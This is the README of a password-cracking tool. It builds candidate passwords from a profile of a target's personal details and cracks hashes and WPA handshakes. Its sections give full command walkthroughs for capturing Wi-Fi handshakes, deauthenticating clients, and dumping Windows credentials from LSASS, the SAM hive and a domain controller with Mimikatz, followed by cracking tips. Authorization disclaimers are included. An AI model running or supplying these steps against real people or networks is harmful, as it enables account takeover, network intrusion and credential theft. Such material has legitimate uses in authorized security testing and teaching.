# password-guesser

Smart, profile-driven password guesser for **educational cybersecurity research**. Generates targeted wordlists and cracks hashes by building intelligent password candidates from known information about a target.

> **Disclaimer:** This tool is intended for authorized security testing, CTF competitions, and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.

## Features

- **Profile-based generation** — Build password candidates from personal info, interests, network details, and custom words defined in a TOML profile
- **Mutation engine** — Automatically applies case variations, leet speak, reversals, word combinations, numeric/symbol suffixes, and common prefixes
- **Hash cracking** — Crack MD5, SHA1, SHA256, SHA512, bcrypt, and NTLM hashes
- **WiFi cracking** — Crack WPA/WPA2 handshakes via aircrack-ng or hashcat
- **Tiered depth control** — Three generation depths: fast (~5K candidates), medium (~20-50K), deep (~100-500K)
- **Parallel processing** — Uses rayon for multi-threaded hash cracking

## Installation

```sh
cargo build --release
```

The binary will be at `target/release/password-guesser`.

## Usage

### 1. Create a target profile

Create a TOML file with known information about the target. See [`examples/target_profile.toml`](examples/target_profile.toml) for a full example:

```toml
[personal]
first_name = "John"
last_name = "Smith"
nickname = "Johnny"
birthdate = "1990-05-15"
partner_name = "Jane"
pet_name = "Buddy"
children_names = ["Emma", "Liam"]
phone = "+1-555-867-5309"

[network]
ssid = "SmithFamily"
router_brand = "Netgear"

[interests]
favorite_team = "Lakers"
favorite_band = "Metallica"
hobbies = ["fishing", "gaming", "guitar"]
favorite_color = "blue"
favorite_number = "7"

[custom]
words = ["mustang", "texas"]
numbers = ["1234", "42"]
```

All fields are optional — fill in whatever you know.

### 2. Generate a wordlist

```sh
password-guesser generate \
  --profile examples/target_profile.toml \
  --output wordlist.txt \
  --depth 2
```

| Flag | Description | Default |
|------|-------------|---------|
| `-p, --profile` | Path to target profile TOML | required |
| `-o, --output` | Output wordlist file | required |
| `-d, --depth` | Generation depth (1=fast, 2=medium, 3=deep) | 2 |
| `--min-length` | Minimum password length | 6 |
| `--max-length` | Maximum password length | 32 |

### 3. Crack hashes

```sh
# Single hash
password-guesser crack-hash \
  --hash "5f4dcc3b5aa765d61d8327deb882cf99" \
  --algo md5 \
  --profile examples/target_profile.toml

# Multiple hashes from file
password-guesser crack-hash \
  --hash-file hashes.txt \
  --algo sha256 \
  --profile examples/target_profile.toml \
  --depth 3
```

Supported algorithms: `md5`, `sha1`, `sha256`, `sha512`, `bcrypt`, `ntlm`

### 4. Capture a WiFi handshake

Before cracking, you need a WPA/WPA2 4-way handshake captured in a `.cap` file. This requires a wireless adapter that supports monitor mode.

**Install aircrack-ng:**

```sh
# macOS
brew install aircrack-ng

# Ubuntu/Debian
sudo apt install aircrack-ng

# Arch
sudo pacman -S aircrack-ng
```

**Step 1 — Identify your wireless interface:**

```sh
airmon-ng
```

This lists available wireless interfaces (e.g. `wlan0`).

**Step 2 — Enable monitor mode:**

```sh
sudo airmon-ng start wlan0
```

This creates a monitor-mode interface (typically `wlan0mon`). It may also kill interfering processes — follow any prompts.

**Step 3 — Scan for networks:**

```sh
sudo airodump-ng wlan0mon
```

This shows nearby access points. Note the target's **BSSID** (MAC address) and **channel** (CH).

**Step 4 — Capture the handshake:**

```sh
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 --write capture wlan0mon
```

Replace `AA:BB:CC:DD:EE:FF` with the target BSSID and `6` with the target channel. This writes capture files including `capture-01.cap`.

Wait until you see `WPA handshake: AA:BB:CC:DD:EE:FF` in the top-right corner. A handshake is captured when a client connects (or reconnects) to the network.

**Step 5 — (Optional) Deauthenticate a client to force a reconnect:**

In a separate terminal, send a deauth to speed up handshake capture:

```sh
sudo aireplay-ng --deauth 4 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**Step 6 — Stop monitor mode when done:**

```sh
sudo airmon-ng stop wlan0mon
```

The resulting `.cap` file can be passed directly to `password-guesser crack-wifi`.

### 5. Crack WiFi handshakes

```sh
# Using aircrack-ng (default)
password-guesser crack-wifi \
  --handshake capture.cap \
  --profile examples/target_profile.toml

# Using hashcat
password-guesser crack-wifi \
  --handshake capture.hccapx \
  --profile examples/target_profile.toml \
  --use-hashcat
```

WiFi mode requires `aircrack-ng` or `hashcat` to be installed. Minimum password length defaults to 8 (WPA requirement).

### 6. Dump and crack Windows credentials with Mimikatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) can extract password hashes from Windows systems during authorized penetration tests. The dumped NTLM hashes can then be cracked with password-guesser.

> **Warning:** Mimikatz must only be used on systems you own or have explicit written authorization to test. Unauthorized credential dumping is illegal.

**Step 1 — Download Mimikatz:**

Download the latest release from the [official Mimikatz releases page](https://github.com/gentilkiwi/mimikatz/releases). Extract it on the target Windows machine.

**Step 2 — Run Mimikatz as Administrator:**

Open an elevated command prompt or PowerShell and launch Mimikatz:

```
mimikatz.exe
```

**Step 3 — Enable debug privileges:**

```
mimikatz # privilege::debug
```

You should see `Privilege '20' OK` confirming SeDebugPrivilege is enabled.

**Step 4 — Dump credentials from LSASS memory:**

```
mimikatz # sekurlsa::logonpasswords
```

This dumps all cached credentials including NTLM hashes. Look for lines like:

```
* NTLM : 32ed87bdb5fdc5e9cba88547376818d4
* SHA1  : a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
```

**Step 5 — (Alternative) Dump the SAM database:**

To extract local account hashes from the SAM registry hive:

```
mimikatz # lsadump::sam
```

This outputs hashes in the format `User : RID : LM-hash : NTLM-hash`.

**Step 6 — (Alternative) Dump from a domain controller (DCSync):**

If you have domain admin privileges during an authorized assessment:

```
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

This replicates password data from Active Directory without touching the domain controller's disk.

**Step 7 — Save the hashes to a file:**

Copy the NTLM hashes into a text file, one per line:

```
32ed87bdb5fdc5e9cba88547376818d4
a94a8fe5ccb19ba61c4c0873d391e987982fbbd3
e99a18c428cb38d5f260853678922e03
```

**Step 8 — Crack with password-guesser:**

NTLM hashes use the MD4(UTF-16LE(password)) algorithm. Use `--algo ntlm` to crack them:

```sh
# Crack NTLM hashes (32-char hex from sekurlsa::logonpasswords)
password-guesser crack-hash \
  --hash-file ntlm_hashes.txt \
  --algo ntlm \
  --profile target_profile.toml \
  --depth 3

# Crack SHA1 hashes if dumped as SHA1
password-guesser crack-hash \
  --hash-file sha1_hashes.txt \
  --algo sha1 \
  --profile target_profile.toml \
  --depth 3
```

**Tips for better results:**

- Build a detailed target profile with the user's known info (name, department, company name, etc.)
- Use `--depth 3` for thorough coverage
- Corporate passwords often follow patterns like `CompanyName2024!` or `Season+Year` — add these to the `[custom]` section of your profile
- For large hash dumps, process them in batches or use the `--hash-file` flag

## How it works

The generator builds candidates in tiers:

1. **Common passwords** — Embedded list of frequently-used passwords
2. **Mutated seed words** — Profile words with case mutations, leet speak, reversals, and doubling
3. **Affixed seeds** — Seed words combined with numeric suffixes, symbol suffixes, common prefixes, and profile-specific numbers
4. **Word combinations** — Pairs of seed words joined, underscored, dotted, and reversed
5. **Keyboard patterns** — Common keyboard walks and number runs
6. **Deep mutations** (depth 3 only) — Mutations applied to combinations, plus mutated seeds with all numeric suffixes

Each tier deduplicates candidates and filters by length constraints.

## Project structure

```
src/
├── main.rs          # CLI entry point and subcommands
├── profile.rs       # TOML profile loading and seed extraction
├── generator.rs     # Tiered candidate generation engine
├── mutations.rs     # Mutation and mangling rules
├── common.rs        # Embedded common passwords, patterns, and affixes
├── wordlist.rs      # Wordlist file I/O
└── cracker/
    ├── mod.rs       # Hash algorithm types and crack result
    ├── hash.rs      # Parallel hash cracking (MD5/SHA/bcrypt/NTLM)
    └── wifi.rs      # WiFi cracking via aircrack-ng/hashcat
```

## License

For educational and authorized security testing use only.
